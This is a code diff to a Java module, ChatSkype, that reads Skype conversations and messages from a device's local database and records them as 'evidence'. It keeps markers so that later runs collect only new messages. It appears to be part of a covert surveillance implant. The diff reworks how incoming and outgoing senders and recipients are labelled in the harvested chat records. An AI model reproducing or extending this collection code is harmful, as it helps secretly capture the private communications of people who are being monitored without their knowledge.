@@ -137,26 +137,25 @@ public class ChatSkype extends SubModuleChat {
 
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
-					String conversation = sc.identity;
+					String peer = sc.peer;
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + conversation + " lastReadIndex: "
+						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " lastReadIndex: "
 								+ sc.lastReadIndex);
 					}
 					groups = new ChatSkypeGroups();
 
 					// retrieves the lastConvId recorded as evidence for this
 					// conversation
-					long lastConvId = lastSkype.containsKey(account + conversation) ? lastSkype.get(account
-							+ conversation) : 0;
+					long lastConvId = lastSkype.containsKey(account + peer) ? lastSkype.get(account + peer) : 0;
 
 					if (sc.lastReadIndex > lastConvId) {
-						if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
-							fetchGroup(helper, conversation);
+						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
+							fetchGroup(helper, peer);
 						}
 
 						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
 						if (lastReadId > 0) {
-							updateMarkupSkype(account + conversation, lastReadId, true);
+							updateMarkupSkype(account + peer, lastReadId, true);
 						}
 
 					}
@@ -186,7 +185,7 @@ public class ChatSkype extends SubModuleChat {
 				SkypeConversation c = new SkypeConversation();
 				c.account = account;
 				c.id = cursor.getInt(0);
-				c.identity = cursor.getString(1);
+				c.peer = cursor.getString(1);
 				c.displayname = cursor.getString(2);
 				c.given = cursor.getString(3);
 				c.lastReadIndex = cursor.getInt(4);
@@ -215,29 +214,40 @@ public class ChatSkype extends SubModuleChat {
 
 				@Override
 				public long cursor(Cursor cursor) {
-
+					// I read a line in a conversation.
 					int id = cursor.getInt(0);
-					String from = cursor.getString(1);
+					String peer = cursor.getString(1);
 					String body = cursor.getString(2);
 					long timestamp = cursor.getLong(3);
 					Date date = new Date(timestamp * 1000L);
 
-					// TODO: sistemare
-					String fromDisplay = from;
+					boolean incoming = !(peer.equals(sc.account));
 
-					String to = sc.identity;
-					String toDisplay = sc.displayname;
+					String from, to;
+					String fromDisplay, toDisplay;
 
-					if (groups.isGroup(sc.identity)) {
-						to = groups.getGroupTo(from, sc.identity);
-						toDisplay = to;
+					if (incoming) {
+						to = sc.account;
+						toDisplay = sc.account;
+						from = peer;
+						fromDisplay = sc.displayname;
+					} else {
+						// outgoing
+						if (groups.isGroup(sc.peer)) {
+							to = groups.getGroupTo(peer, sc.peer);
+							toDisplay = to;
+						} else {
+							to = peer;
+							toDisplay = sc.displayname;
+						}
+						from = sc.account;
+						fromDisplay = from;
+												
 					}
 
-					boolean incoming = sc.isIncoming();
-
 					if (!StringUtils.isEmpty(body)) {
-						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to,
-								toDisplay, body, incoming);
+						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
+								body, incoming);
 
 						messages.add(message);
 					}
